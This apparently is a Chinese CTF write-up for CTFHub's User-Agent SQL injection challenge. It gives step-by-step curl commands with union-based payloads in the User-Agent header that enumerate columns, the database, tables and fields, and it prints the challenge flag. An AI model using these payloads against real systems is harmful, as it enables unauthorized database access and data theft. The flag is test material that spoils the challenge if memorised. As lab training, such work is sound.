---
title: CTFHub-SQL注入-UA注入 Writeup
date: 2026-09-30
category: web
tags: [CTFHub, SQL注入, UA注入]
---
## 漏洞分析

页面提示“输入点在User-Agent，试试吧”，并且直接暴露了后端SQL查询语句：
select * from news where id=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36 Edg/154.0.0.0
由此可以确定：后端直接把HTTP请求头中的 User-Agent 值拼接到SQL语句中，且没有做任何过滤，属于典型的 User-Agent 注入，并且是整数型注入。

## 注入过程

由于本题不想使用Burp Suite，全程采用 curl 命令在 CMD 中修改请求头进行注入测试。

### 1. 判断注入点与列数

通过尝试 order by 判断列数：

```bash
curl -H "User-Agent: 1 order by 2" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

页面正常回显，说明当前查询结果共有 2列。

### 2. 确认回显位置

构造联合查询，用 -1 让前面的查询失效：

```bash
curl -H "User-Agent: -1 union select 1,2" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

页面回显 ID: 1<br>Data: 2，说明第2列是回显位。

### 3. 获取当前数据库名

```bash
curl -H "User-Agent: -1 union select 1,database()" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

回显：

```
ID: 1
Data: sqli
```

得到当前数据库名为 sqli。

### 4. 获取数据库中的表名

```bash
curl -H "User-Agent: -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

回显：

```
ID: 1
Data: tuowgyqyxm,news
```

发现两张表：tuowgyqyxm（可疑表名）和 news。

### 5. 获取 tuowgyqyxm 表的字段名

```bash
curl -H "User-Agent: -1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='tuowgyqyxm'" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

回显：

```
ID: 1
Data: zcamauotbt
```

得到字段名 zcamauotbt。

###6. 读取最终数据（flag）

```bash
curl -H "User-Agent: -1 union select 1,zcamauotbt from tuowgyqyxm" http://challenge-c59dc3b55e19a4a6.sandbox.ctfhub.com:10800
```

成功获取flag：

```
ID: 1
Data: ctfhub{ad12a9c2308ed019af2e81eb}
```

## Flag
ctfhub{ad12a9c2308ed019af2e81eb}
